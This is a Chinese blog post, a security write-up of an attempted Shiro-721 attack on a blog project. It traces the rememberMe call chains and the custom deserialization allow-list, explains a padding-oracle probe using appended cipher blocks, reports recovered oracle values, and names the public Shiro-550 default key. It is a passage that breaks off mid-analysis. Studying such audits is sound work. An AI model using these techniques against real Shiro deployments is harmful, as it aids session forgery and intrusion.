@@ -1,0 +1,1095 @@
+
+            <h1 class="postTitle">
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/nihao-xing/p/23645410" title="发布于 2026-11-13 22:01">
+    
+
+    <span role="heading" aria-level="2">记一次失败的shiro721bypass(但是成功打通padding oracle（加密层）)</span>
+    
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+<p>当时闲的没事从网上拉了一个最符合shiro721特征的项目，结果发现加密层都不好打，然后rce层让白名单拦截完了。下面让我们看下这个具体的项目以及破解加密层的思路还有白名单的分析。<br>
+<a href="https://www.cnblogs.com/nihao-xing/p/23433100" target="_blank">https://www.cnblogs.com/nihao-xing/p/23433100</a><br>
+不会基础的看这篇</p>
+<h2 id="1依旧先看pomxml和readmemd">1.依旧先看pom.xml和README.md</h2>
+<p><img alt="PixPin_2026-11-13_17-25-12" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3858383/202611/3858383-20261113172528701-671116484.png" class="lazyload"><br>
+README.md写的shiro版本1.7.1<br>
+<img alt="PixPin_2026-11-13_17-23-24" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3858383/202611/3858383-20261113181027274-2033169045.png" class="lazyload"></p>
+<p>pom.xml的shiro版本</p>
+<pre><code>          &lt;fastjson.version&gt;1.2.83&lt;/fastjson.version&gt;
+        &lt;shiro.spring.version&gt;1.4.0&lt;/shiro.spring.version&gt;
+        &lt;shiro.redis.version&gt;2.4.2.1-RELEASE&lt;/shiro.redis.version&gt;
+</code></pre>
+<p>如果shiro版本大于1.4.1，shiro721是打不出来的，自己去官网查下影响版本</p>
+<h2 id="2根据第一篇文章的思路搜shiroconfig">2.根据第一篇文章的思路，搜shiroconfig</h2>
+<p><img alt="PixPin_2026-11-13_17-32-01" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3858383/202611/3858383-20261113173202633-1739721350.png" class="lazyload"></p>
+<p>打开shiroconfig.java<br>
+全局搜索文本：CookieRememberMeManager、cipherKey、rememberMe。</p>
+<pre><code> @Bean(name = "securityManager")
+    public SecurityManager securityManager(@Qualifier("shiroRealm") ShiroRealm authRealm) {
+        DefaultWebSecurityManager securityManager = new DefaultWebSecurityManager();
+        // 设置realm.
+        securityManager.setRealm(authRealm);
+        securityManager.setCacheManager(redisCacheManager());
+        // 自定义session管理 使用redis
+        securityManager.setSessionManager(sessionManager());
+        // 注入记住我管理器
+        securityManager.setRememberMeManager(rememberMeManager());
+        return securityManager;
+    }
+</code></pre>
+<p>setRememberMeManager 说明rememberMe 开启，反序列化入口存在</p>
+<pre><code>
+   /**
+     * cookie管理对象;记住我功能
+     *
+     * @return
+     */
+    public CookieRememberMeManager rememberMeManager() {
+        CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager();
+        // 使用自定义的序列化类
+        cookieRememberMeManager.setSerializer(new MySecSerializer&lt;&gt;());
+        cookieRememberMeManager.setCookie(rememberMeCookie());
+        //rememberMe cookie加密的密钥 建议每个项目都不一样 默认AES算法 密钥长度(128 192 256 位)
+        cookieRememberMeManager.setCipherKey(GenerateCipherKey.generateNewKey());
+        return cookieRememberMeManager;
+    }
+
+    /**
+     * 解决 shiro 反序列化漏洞
+     *
+     * https://blog.csdn.net/qq_34775355/article/details/106643678
+     */
+    public static class GenerateCipherKey {
+
+        /**
+         * 随机生成秘钥，参考org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey(int)
+         *
+         * @return byte[]
+         */
+        public static byte[] generateNewKey() {
+            KeyGenerator kg;
+            try {
+                kg = KeyGenerator.getInstance("AES");
+            } catch (NoSuchAlgorithmException var5) {
+                String msg = "Unable to acquire AES algorithm.  This is required to function.";
+                throw new IllegalStateException(msg, var5);
+            }
+            // 满足合规应使用256位（JDK8u161前不支持AES-256，改用128位）
+            kg.init(128);
+            SecretKey key = kg.generateKey();
+            return key.getEncoded();
+        }
+    }
+}
+</code></pre>
+<ul>
+<li>setSerializer(new MySecSerializer&lt;&gt;())，关键线索：自定义序列化器，防护大概率在这里，必须跟进</li>
+<li>GenerateCipherKey.generateNewKey()，密钥随机生成，非硬编码 → Shiro-550（默认 key 直接构造）排除<br>
+<img alt="PixPin_2026-11-13_17-42-19" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3858383/202611/3858383-20261113174223086-2021495460.png" class="lazyload"><br>
+光标放在MySecSerializer&lt;&gt;()，跳一下，或者ctrl+ait+h<br>
+在MySecSerializer.java</li>
+</ul>
+<pre><code>public class MySecSerializer&lt;T&gt; implements Serializer&lt;T&gt; {
+    @Override
+    public byte[] serialize(T o) throws SerializationException {
+        // 标准 ObjectOutputStream，无任何过滤
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(o);
+        oos.close();
+        return baos.toByteArray();
+    }
+
+    @Override
+    public T deserialize(byte[] serialized) throws SerializationException {
+        ByteArrayInputStream bais = new ByteArrayInputStream(serialized);
+        BufferedInputStream bis = new BufferedInputStream(bais);
+        
+        ObjectInputStream ois = new MyClassResolvingObjectInputStream(bis);
+        T deserialized = (T) ois.readObject();     // ← readObject 触发 resolveClass
+        ois.close();
+        return deserialized;
+    }
+}
+</code></pre>
+<p>serialize（写方向）无防护——正常，序列化方向不需要防护<br>
+deserialize（读方向）是防护落点——MyClassResolvingObjectInputStream 是核心<br>
+<strong>思考：这段代码有没有sink？</strong><br>
+目前来讲是看不出来的，因为有一个问题。<br>
+ta引用了非标准类</p>
+<pre><code>ObjectInputStream ois = new MyClassResolvingObjectInputStream(bis);
+//                      ↑ 不是 new ObjectInputStream(bis)
+//                      ↑ 自定义子类 → 必须点进去看
+</code></pre>
+<p>MyClassResolvingObjectInputStream点进去看<br>
+在MyClassResolvingObjectlnputStream.java</p>
+<pre><code>public class MyClassResolvingObjectInputStream extends ObjectInputStream {
+    public MyClassResolvingObjectInputStream(InputStream inputStream) throws IOException {
+        super(inputStream);
+    }
+
+    @Override
+    protected Class&lt;?&gt; resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {
+        try {
+            String s = osc.getName();
+            // 干掉常见的gadget，为了避免 [ ; 符号，必须使用contains方法
+            // 简单的使用 s.equals 可能导致fastjson 以前出现的黑名单逃逸问题
+            if (s.contains("java.util.PriorityQueue") || s.contains("xsltc.trax.TemplatesImpl")) {
+                throw new ClassNotFoundException("Unable to load Dangerous ObjectStreamClass [" + osc + "]");
+            }
+            if (s.contains("org.apache.")) {
+                // 直接干掉了 org.apache ，但是要保留shiro自己
+                if (s.startsWith("org.apache.shiro.subject.")) {
+                    return ClassUtils.forName(s);
+                }
+                throw new ClassNotFoundException("Unable to load Dangerous ObjectStreamClass [" + osc + "]");
+            }
+            // 使用白名单保证业务的正常开展
+            if (s.startsWith("java.lang") || s.startsWith("java.util")) {
+                return ClassUtils.forName(s);
+            } else {
+                throw new ClassNotFoundException("Unable to load Dangerous ObjectStreamClass [" + osc + "]");
+            }
+        } catch (UnknownClassException var3) {
+            throw new ClassNotFoundException("Unable to load ObjectStreamClass [" + osc + "]: ", var3);
+        }
+    }
+}
+</code></pre>
+<p>分析</p>
+<pre><code>public class MyClassResolvingObjectInputStream extends ObjectInputStream {
+
+    @Override
+    protected Class&lt;?&gt; resolveClass(ObjectStreamClass osc) {
+        // ↑ 这就是反序列化的"类加载闸门"
+        // Java 反序列化每遇到一个类描述符，就调一次这个方法
+        // 重写它 = 控制了"哪些类能被加载"
+    }
+}
+</code></pre>
+<p>1.白名单进一步分析<br>
+<img alt="PixPin_2026-11-13_18-05-36" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3858383/202611/3858383-20261113180622484-252315704.png" class="lazyload"><br>
+<img alt="PixPin_2026-11-13_18-07-27" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3858383/202611/3858383-20261113181842553-1061042356.png" class="lazyload"><br>
+白名单策略：只放行 java.lang / java.util 前缀（及 org.apache.shiro.subject.*），其余全部拒绝。<br>
+<img alt="PixPin_2026-11-13_18-19-31" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3858383/202611/3858383-20261113181934154-943101520.png" class="lazyload"><br>
+显式拒绝：PriorityQueue、TemplatesImpl（覆盖常见 gadget 的 sink 与触发器）。<br>
+这是一个严格白名单，防护强度高。</p>
+<blockquote>
+<p>resolveClass 是 Java 反序列化的"类加载闸门"。重写它做白名单，是最有效的反序列化 RCE 防护手段。审计时要同时检查它有没有遗漏 resolveProxyClass（动态代理接口加载走的是另一个方法）</p>
+</blockquote>
+<p>2.白名单逻辑拆解</p>
+<pre><code>输入：序列化流中每个类的规范类名 s = osc.getName()
+
+第①层：s.contains("java.util.PriorityQueue") || s.contains("xsltc.trax.TemplatesImpl")  → 拒绝
+第②层：s.contains("org.apache.")  → 仅 org.apache.shiro.subject.* 放行，其余拒绝
+第③层：s.startsWith("java.lang") || s.startsWith("java.util")  → 放行
+        否则 → 拒绝
+</code></pre>
+<p>3.与常见 gadget 的对照</p>
+<table>
+<thead>
+<tr>
+<th>gadget 链关键类</th>
+<th>完整类名</th>
+<th>命中分支</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CC 链触发器</td>
+<td><code>java.util.PriorityQueue</code></td>
+<td>① contains</td>
+<td>拦</td>
+</tr>
+<tr>
+<td>字节码 sink</td>
+<td><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></td>
+<td>① contains</td>
+<td>拦</td>
+</tr>
+<tr>
+<td>CC 链转换器</td>
+<td><code>org.apache.commons.collections.*</code></td>
+<td>②</td>
+<td>拦</td>
+</tr>
+<tr>
+<td>CB 链比较器</td>
+<td><code>org.apache.commons.beanutils.BeanComparator</code></td>
+<td>②</td>
+<td>拦</td>
+</tr>
+<tr>
+<td>JDK 代理 handler</td>
+<td><code>sun.reflect.annotation.AnnotationInvocationHandler</code></td>
+<td>③ else</td>
+<td>拦</td>
+</tr>
+<tr>
+<td>JDK8u20 gadget</td>
+<td><code>java.beans.beancontext.*</code></td>
+<td>③ else</td>
+<td>拦</td>
+</tr>
+<tr>
+<td>URLDNS</td>
+<td><code>java.net.URL</code></td>
+<td>③ else</td>
+<td>拦</td>
+</tr>
+<tr>
+<td>合法 principal</td>
+<td><code>org.apache.shiro.subject.SimplePrincipalCollection</code></td>
+<td>② 特例</td>
+<td>放行</td>
+</tr>
+</tbody>
+</table>
+<ol start="4">
+<li>审计要点：<code>resolveProxyClass</code> 未重写<br>
+用 IDEA 查看 MyClassResolvingObjectInputStream 的方法列表（Ctrl+F12）：<br>
+<img alt="PixPin_2026-11-13_18-30-58" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3858383/202611/3858383-20261113183110131-1417624323.png" class="lazyload"><br>
+<code>resolveClass(ObjectStreamClass): Class&lt;?&gt; ↑ObjectlnputStream</code>唯一高亮</li>
+</ol>
+<pre><code>resolveClass(ObjectStreamClass)   ← 已重写（白名单生效）
+resolveProxyClass(String[])       ← 未重写（默认实现，旁路）
+</code></pre>
+<p>旁路含义：动态代理（Proxy）的接口加载走 resolveProxyClass，不受白名单约束；但 Proxy 的 InvocationHandler 仍走 resolveClass（被白名单拦）。<br>
+我们已经看到了它的白名单<br>
+下面我们该干点什么？</p>
+<h2 id="3调用链追踪写入方向">3.调用链追踪（写入方向）</h2>
+<p><strong>1.看 Shiro 过滤链配置</strong><br>
+在ShiroServiceImpl.loadFilterChainDefinitions()</p>
+<pre><code> @Override
+    public Map&lt;String, String&gt; loadFilterChainDefinitions() {
+        /*
+            配置访问权限
+            - anon:所有url都都可以匿名访问
+            - authc: 需要认证才能进行访问（此处指所有非匿名的路径都需要登录才能访问）
+            - user:配置记住我或认证通过可以访问
+         */
+        Map&lt;String, String&gt; filterChainDefinitionMap = new LinkedHashMap&lt;String, String&gt;();
+        // 配置退出过滤器,其中的具体的退出代码Shiro已经替我们实现了
+        filterChainDefinitionMap.put("/passport/logout", "logout");
+        filterChainDefinitionMap.put("/passport/login", "anon");
+        filterChainDefinitionMap.put("/passport/signin", "anon");
+        filterChainDefinitionMap.put("/websocket", "anon");
+        filterChainDefinitionMap.put("/favicon.ico", "anon");
+        filterChainDefinitionMap.put("/error", "anon");
+        filterChainDefinitionMap.put("/assets/**", "anon");
+        filterChainDefinitionMap.put("/plugin/**", "anon");
+        filterChainDefinitionMap.put("/vendors/**", "anon");
+        filterChainDefinitionMap.put("/getKaptcha", "anon");
+        // 加载数据库中配置的资源权限列表
+        List&lt;Resources&gt; resourcesList = resourcesService.listUrlAndPermission();
+        if (CollectionUtils.isEmpty(resourcesList)) {
+            throw new ZhydException("未加载到resources内容，请确认是否执行了init_data.sql");
+        }
+        for (Resources resources : resourcesList) {
+            if (!StringUtils.isEmpty(resources.getUrl()) &amp;&amp; !StringUtils.isEmpty(resources.getPermission())) {
+                String permission = "perms[" + resources.getPermission() + "]";
+                filterChainDefinitionMap.put(resources.getUrl(), permission);
+            }
+        }
+        // 本博客中并不存在什么特别关键的操作，所以直接使用user认证。如果有朋友是参考本博客的shiro开发其他安全功能（比如支付等）时，建议针对这类操作使用authc权限 by yadong.zhang
+        filterChainDefinitionMap.put("/**", "user");
+        return filterChainDefinitionMap;
+    }
+</code></pre>
+<pre><code>filterChainDefinitionMap.put("/passport/login", "anon");
+filterChainDefinitionMap.put("/passport/signin", "anon");  // ← 登录接口在这
+</code></pre>
+<p>最后一行决定 rememberMe 的攻击价值<br>
+<code>filterChainDefinitionMap.put("/**", "user");</code><br>
+user ≠ authc。user 表示"记住我或已认证都可以"。说明 rememberMe 反序列化一旦成功，不用重新登录就能访问几乎所有功能。如果最后是 authc，rememberMe 的价值就大打折扣。、<br>
+<strong>2:从 URL 反查 Controller</strong><br>
+全局搜索/passport/signin<br>
+<img alt="PixPin_2026-11-13_20-30-55" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3858383/202611/3858383-20261113203109105-734940762.png" class="lazyload"></p>
+<pre><code>@BussinessLog("[{1}]登录系统")
+    @PostMapping("/signin")
+    @ResponseBody
+    public ResponseVO submitLogin(String username, String password, boolean rememberMe, String kaptcha) {
+        if (config.isEnableKaptcha()) {
+            if (StringUtils.isEmpty(kaptcha) || !kaptcha.equals(SessionUtil.getKaptcha())) {
+                return ResultUtil.error("验证码错误！");
+            }
+            SessionUtil.removeKaptcha();
+        }
+        UsernamePasswordToken token = new UsernamePasswordToken(username, password, rememberMe);
+        //获取当前的Subject
+        Subject currentUser = SecurityUtils.getSubject();
+        try {
+            // 在调用了login方法后,SecurityManager会收到AuthenticationToken,并将其发送给已配置的Realm执行必须的认证检查
+            // 每个Realm都能在必要时对提交的AuthenticationTokens作出反应
+            // 所以这一步在调用login(token)方法时,它会走到xxRealm.doGetAuthenticationInfo()方法中,具体验证方式详见此方法
+            currentUser.login(token);
+            SavedRequest savedRequest = WebUtils.getSavedRequest(RequestHolder.getRequest());
+            String historyUrl = null;
+            if(null != savedRequest) {
+                if(!savedRequest.getMethod().equals("POST")) {
+                    historyUrl = savedRequest.getRequestUrl();
+                }
+            }
+            return ResultUtil.success(null, historyUrl);
+        } catch (Exception e) {
+            log.error("登录失败，用户名[{}]：{}", username, e.getMessage());
+            token.clear();
+            return ResultUtil.error(e.getMessage());
+        }
+    }
+</code></pre>
+<p>定位 submitLogin ， 顺藤摸瓜找到 UsernamePasswordToken<br>
+<strong>思考：为什么要搜索 UsernamePasswordToken</strong><br>
+"用户名+密码+记住我"这种登录方式，UsernamePasswordToken 是唯一入口——Shiro 源码里 login() 只收 AuthenticationToken 接口，而同时承载"用户名、密码、rememberMe"三要素的实现只有这一个类。所以搜它不会漏。</p>
+<blockquote>
+<p>如果项目用 JWT/OAuth2/自定义 Token（比如 new BearerToken(jwt)），那根本不会出现 UsernamePasswordToken——但那种项目也没有传统 rememberMe，Shiro 反序列化这条链也就无从谈起。</p>
+</blockquote>
+<p><img alt="PixPin_2026-11-13_20-39-32" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3858383/202611/3858383-20261113203940359-562519138.png" class="lazyload"><br>
+UsernamePasswordToken ctrl+alt+h</p>
+<pre><code>~ UsernamePasswordToken.UsernamePasswordToken(String, String, boolean) (org.apache.shiro.authc)
+    ~ RememberAuthenticationlnterceptor.preHandle(HttpServletRequest, HttpServletResponse, Object) (com.Zyd.blog.core.interceptor)
+    ~ PassportController.submitLogin(String, String, boolean, String) (com.zyd.blog.controller)
+</code></pre>
+<p>出现两个入口：</p>
+<p>PassportController.submitLogin —— 手动登录入口<br>
+RememberAuthenticationInterceptor.preHandle —— rememberMe 自动登录入口（无感知升级）<br>
+<strong>3.我们来拼一下调用链</strong><br>
+这个调用链很长</p>
+<ol>
+<li>从入口开始：PassportController.submitLogin</li>
+<li><code>SecurityUtils.getSubject().login(token)</code> — 跟进去</li>
+<li><code>login(token)</code> — Ctrl+B 跳到 DelegatingSubject</li>
+<li>继续 Ctrl+B 跟 DefaultSecurityManager.login</li>
+<li>看 login 方法体 → authenticate 和 onSuccessfulLogin</li>
+<li>onSuccessfulLogin → Ctrl+B 看到 rememberMeSuccessfulLogin</li>
+<li>继续跟 → AbstractRememberMeManager.onSuccessfulLogin</li>
+<li>看方法体 → forgetIdentity + rememberIdentity</li>
+<li>rememberIdentity → convertPrincipalsToBytes</li>
+<li>convertPrincipalsToBytes 里 → serialize + encrypt<br>
+完整的手工拼接分四个阶段：</li>
+</ol>
+<p><strong>阶段一：写入链（登录 → rememberMe 设置）</strong></p>
+<pre><code>11. serialize — 项目注入的是 MySecSerializer → 回项目看
+12. encrypt(serialized) — Ctrl+B 进 AbstractRememberMeManager.encrypt
+     → 读方法体：cipherService.encrypt(serialized, getEncryptionCipherKey())
+     → Ctrl+B 进 AesCipherService.encrypt → AES-CBC，随机 IV
+13. 回到 onSuccessfulLogin → rememberSerializedIdentity
+     → Ctrl+B 发现是 abstract → Ctrl+Alt+B 看实现：CookieRememberMeManager
+     → rememberSerializedIdentity → getCookie().setValue(base64密文)
+</code></pre>
+<p><strong>阶段二：读取链（请求 → 反序列化）</strong></p>
+<p>这个不能从入口正向跟（ShiroFilter 太深），改用<strong>反向追</strong>：</p>
+<pre><code>在 MySecSerializer.deserialize 上 → Ctrl+Alt+H（Find Usages）
+  → 只有一处调用：AbstractRememberMeManager.deserialize(bytes)
+     → 谁调 deserialize？→ convertBytesToPrincipals
+        → 谁调 convertBytesToPrincipals？→ getRememberedPrincipals
+           → 谁调？→ DefaultSecurityManager.getRememberedIdentity
+              → resolvePrincipals → createSubject → AbstractShiroFilter.doFilterInternal
+</code></pre>
+<p><strong>阶段三：白名单分析</strong></p>
+<pre><code>deserialize → new MyClassResolvingObjectInputStream
+  → Ctrl+B 进 MyClassResolvingObjectInputStream
+     → 看方法列表（Ctrl+F12）：resolveClass ✓，resolveProxyClass ✗
+        → resolveClass 读逐行逻辑
+        → resolveProxyClass 未重写 → 接口旁路
+</code></pre>
+<p><strong>阶段四：认证链路（为身份伪造准备）</strong></p>
+<pre><code>ShiroConfig → setRealm(new ShiroRealm)
+  → Ctrl+B 进 ShiroRealm.doGetAuthenticationInfo
+     → 看到返回 SimpleAuthenticationInfo(user.getId(), ..., getName())
+        → principal = Long userId
+        → realm name = getName()
+           → Ctrl+B 进父类 CachingRealm 构造器
+              → setName(getClass().getName() + "_" + INSTANCE_COUNT.getAndIncrement())
+</code></pre>
+<p><strong>反向验证（防遗漏）</strong></p>
+<p>每条链追完后，从最底层反向做 Call Hierarchy，确保中间没有缺失的桥接方法：</p>
+<pre><code>CookieRememberMeManager.rememberSerializedIdentity → Ctrl+Alt+H
+  → AbstractRememberMeManager.rememberIdentity ✓
+  → 没有其他调用者，链完整
+
+MyClassResolvingObjectInputStream.resolveClass → Ctrl+Alt+H
+  → 只有 ObjectInputStream.readObject 内部调用 ✓
+</code></pre>
+<p>四条线串完，三份证据（写入、读取、认证）互相印证，没有断层。</p>
+<pre><code>PassportController.submitLogin()
+  └─ new UsernamePasswordToken(username, password, rememberMe)   // isRememberMe = true
+  └─ SecurityUtils.getSubject().login(token)
+       └─ DelegatingSubject.login(token)
+            └─ DefaultSecurityManager.login(subject, token)
+                 ├─ authenticate(token)
+                 │    └─ ModularRealmAuthenticator.doAuthenticate
+                 │         └─ ShiroRealm.doGetAuthenticationInfo()      // 认证校验
+                 │              └─ 返回 SimpleAuthenticationInfo(userId, password, salt=username, realmName)
+                 └─ onSuccessfulLogin(token, info, subject)
+                      └─ rememberMeSuccessfulLogin(token, info, subject)   // 前提 token.isRememberMe()
+                           └─ AbstractRememberMeManager.onSuccessfulLogin(subject, token, info)
+                                ├─ forgetIdentity(subject)                 // 先清旧 cookie（deleteMe）
+                                └─ rememberIdentity(subject, token, info)
+                                     └─ convertPrincipalsToBytes(principals)
+                                          ├─ serialize(principals)
+                                          │    └─ MySecSerializer.serialize()
+                                          └─ encrypt(serialized)
+                                               └─ AesCipherService.encrypt()   // AES-CBC + 随机 IV
+                                     └─ CookieRememberMeManager.rememberSerializedIdentity(subject, bytes)
+                                          └─ Set-Cookie: rememberMe=base64(IV + ciphertext)
+</code></pre>
+<p>这是整个调用链<br>
+这调用链这么麻烦<br>
+确实麻烦。但 Shiro 是标准化框架，其实不需要逐层追——<strong>直接搜关键方法名然后反向拼</strong>就够了，五分钟的事：</p>
+<pre><code>搜 "convertBytesToPrincipals"  → 直接定位到反序列化入口
+搜 "rememberIdentity"           → 直接定位到序列化入口  
+搜 "onSuccessfulLogin"          → 定位 rememberMe 决策点
+搜 "getRememberedPrincipals"    → 定位读取入口
+</code></pre>
+<p>Shiro 的方法名是<strong>稳定 API</strong>，每个版本都一样。审计 Shiro 不需要从 <code>submitLogin</code> 一层层下钻，直接搜 Shiro 内部方法名，一步跳到核心逻辑，然后 <code>Ctrl+Alt+H</code> 反向追调用者：</p>
+<pre><code>convertBytesToPrincipals
+  → Ctrl+Alt+H → 被 getRememberedPrincipals 调 → 被 getRememberedIdentity 调 → resolvePrincipals → createSubject
+
+一条链，一搜一反，搞定。
+</code></pre>
+<p>真正需要逐层追的只有<strong>项目自定义的部分</strong>（MySecSerializer → MyClassResolvingObjectInputStream），那个深度也就两步。</p>
+<h2 id="4shirorealmjava认证源码">4.ShiroRealm.java认证源码</h2>
+<p><code>ShiroRealm.doGetAuthenticationInfo</code>：</p>
+<pre><code>protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) {
+    String username = (String) token.getPrincipal();
+    User user = userService.getByUserName(username);
+    if (user == null) throw new UnknownAccountException("账号不存在！");
+    ...
+    // principal 参数使用用户 Id，方便动态刷新用户权限
+    return new SimpleAuthenticationInfo(
+            user.getId(),                    // principal = Long userId（会被序列化进 rememberMe）
+            user.getPassword(),              // credentials
+            ByteSource.Util.bytes(username), // salt = username
+            getName());
+}
+</code></pre>
+<p>rememberMe 序列化的对象是 <code>SimplePrincipalCollection</code>（含 <code>Long userId</code>），这是后续反序列化"合法垫子"的明文结构来源。</p>
+<h2 id="调用链追踪读取方向请求--反序列化">调用链追踪（读取方向）：请求 → 反序列化</h2>
+<h3 id="反向追踪方法idea-操作">反向追踪方法（IDEA 操作）</h3>
+<p>两种方式定位读取链路：</p>
+<ul>
+<li><strong>方式 A（正向下钻）</strong>：从 <code>AbstractShiroFilter</code> 入口向下追。</li>
+<li><strong>方式 B（反向查找）</strong>：在 <code>MySecSerializer.deserialize()</code> 上 <code>Alt+F7</code>（Find Usages），追到调用方 <code>AbstractRememberMeManager.deserialize()</code>，再逐层向上追到 <code>getRememberedPrincipals()</code>。<br>
+调用链</li>
+</ul>
+<pre><code>HTTP 请求
+  └─ AbstractShiroFilter.doFilterInternal()
+       └─ createSubject(request, response)
+            └─ DefaultWebSecurityManager.createSubject(subjectContext)
+                 └─ DefaultSecurityManager.resolvePrincipals(subjectContext)
+                      └─ getRememberedIdentity(subjectContext)
+                           └─ AbstractRememberMeManager.getRememberedPrincipals(subjectContext)   ★
+                                ├─ getRememberedSerializedIdentity(subjectContext)
+                                │    └─ 读 Cookie "rememberMe" → Base64 解码
+                                └─ convertBytesToPrincipals(bytes, subjectContext)
+                                     ├─ decrypt(bytes)                    // 【门1】AES-CBC 解密 + padding 校验
+                                     │    └─ JcaCipherService.decrypt()
+                                     │         ├─ 分离 IV（前16字节）
+                                     │         └─ Cipher.doFinal()
+                                     │              └─ padding 错 → BadPaddingException → CryptoException
+                                     └─ deserialize(bytes)                // 【门2】反序列化
+                                          └─ MySecSerializer.deserialize()
+                                               └─ MyClassResolvingObjectInputStream.readObject()
+                                                    └─ resolveClass()    // 【门3】白名单
+                                                         └─ 恶意类 → ClassNotFoundException → SerializationException
+                                └─ 任一异常 → onRememberedPrincipalFailure()
+                                     └─ forgetIdentity() → Set-Cookie: rememberMe=deleteMe
+</code></pre>
+<h2 id="4shiro-140-关键方法源码反编译">4.Shiro 1.4.0 关键方法源码（反编译）</h2>
+<p>`AbstractRememberMeManager.getRememberedPrincipals</p>
+<pre><code>public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
+    PrincipalCollection principals = null;
+    try {
+        byte[] bytes = getRememberedSerializedIdentity(subjectContext);
+        if (bytes != null &amp;&amp; bytes.length &gt; 0) {
+            principals = convertBytesToPrincipals(bytes, subjectContext);
+        }
+    } catch (RuntimeException re) {
+        principals = onRememberedPrincipalFailure(re, subjectContext);   // 统一失败处理
+    }
+    return principals;
+}
+
+protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
+    if (getCipherService() != null) {
+        bytes = decrypt(bytes);      // 失败 → CryptoException
+    }
+    return deserialize(bytes);       // 失败 → SerializationException
+}
+
+protected PrincipalCollection onRememberedPrincipalFailure(RuntimeException e, SubjectContext context) {
+    forgetIdentity(context);         // → 发 rememberMe=deleteMe
+    return null;
+}
+</code></pre>
+<h3 id="动态验证结论实测">动态验证结论（实测）</h3>
+<table>
+<thead>
+<tr>
+<th>场景</th>
+<th>断点表现</th>
+<th>结论</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>合法 cookie</td>
+<td>① 走到 readObject 成功，续期</td>
+<td>反序列化成功</td>
+</tr>
+<tr>
+<td>篡改末尾字节</td>
+<td>③ 抛 BadPaddingException</td>
+<td>padding 校验在解密层</td>
+</tr>
+<tr>
+<td>篡改 IV</td>
+<td>① 抛 StreamCorruptedException（invalid stream header）</td>
+<td>流头损坏</td>
+</tr>
+<tr>
+<td>追加块 padding 合法</td>
+<td>② 前段类名正常，尾部忽略</td>
+<td>"合法垫子"使反序列化成功</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="攻击面判定与利用思路">攻击面判定与利用思路</h2>
+<h3 id="一判定结论">一判定结论</h3>
+<table>
+<thead>
+<tr>
+<th>攻击路径</th>
+<th>判定</th>
+<th>依据</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Shiro-550（默认 key）</td>
+<td>不可用</td>
+<td><code>GenerateCipherKey.generateNewKey()</code> 随机密钥，非 <code>kPH+bIxk5D2deZiIxcaaaA==</code></td>
+</tr>
+<tr>
+<td>Shiro-721（CBC padding oracle）</td>
+<td>加密层可利用</td>
+<td>1.4.0 AES-CBC；oracle 可区分（合法密文垫子）；中间值可恢复</td>
+</tr>
+<tr>
+<td>反序列化 RCE</td>
+<td>被白名单拦截</td>
+<td><code>resolveClass</code> 拒绝所有 gadget 类</td>
+</tr>
+</tbody>
+</table>
+<h3 id="二-shiro-721-padding-oracle-可利用性分析关键">二 Shiro-721 Padding Oracle 可利用性分析（关键）</h3>
+<p><strong>oracle 判据</strong>：响应中 <code>Set-Cookie: rememberMe</code> 是否为<strong>非 deleteMe 的新值</strong>。</p>
+<p><strong>"合法密文垫子"原理</strong>：</p>
+<pre><code>合法密文 = IV(16B) + 29 密文块(464B)
+解密明文 = SimplePrincipalCollection 序列化(448B) + PKCS5 padding(16B)
+
+探测：发送 合法密文 + prefix块(16B) + 试探块(16B)
+解密明文 = [合法 principal 448B] + [padding 16B] + [乱码] + [乱码(含合法padding)]
+
+ObjectInputStream.readObject() 只读第一个对象（448B）即返回，忽略尾部乱码
+→ 试探块 padding 合法 → 反序列化成功 → 续期 → 无 deleteMe
+→ 试探块 padding 非法 → 解密失败 → deleteMe
+→ oracle 可区分！
+</code></pre>
+<p><strong>实证数据</strong>：</p>
+<ul>
+<li>遍历 prefix 末字节 0-255，唯一值 <code>185</code> 使 padding 合法</li>
+<li>中间值恢复 <code>D(0x00...00)</code>：<code>...c799629354b8</code>（每字节唯一确定）</li>
+</ul>
+<h3 id="三-白名单-bypass-分析最终-rce-判定">三 白名单 bypass 分析（最终 RCE 判定）</h3>
+<p><strong>resolveClass 三层白名单</strong>挡住所有已知 gadget：</p>
+<table>
+<thead>
+<tr>
+<th>绕过思路</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>TemplatesImpl / PriorityQueue 变体</td>
+<td>contains 精确拦截</td>
+</tr>
+<tr>
+<td>org.apache.* 逃逸</td>
+<td>整段拒绝（仅 shiro.subject 放行）</td>
+</tr>
+<tr>
+<td>纯 java.lang/java.util 内 RCE 链</td>
+<td>无已知链</td>
+</tr>
+<tr>
+<td>数组类名</td>
+<td><code>[L...;</code> 不以 java.lang 开头</td>
+</tr>
+<tr>
+<td><strong>resolveProxyClass 旁路</strong></td>
+<td>接口绕过，但 handler 仍被 resolveClass 拦</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Proxy 链三环判定</strong>：</p>
+<pre><code>① 接口       → resolveProxyClass（未重写，绕过 ）但 Class.forName(iface,false) 不执行代码
+② handler    → resolveClass（白名单 ）白名单内无 InvocationHandler 实现
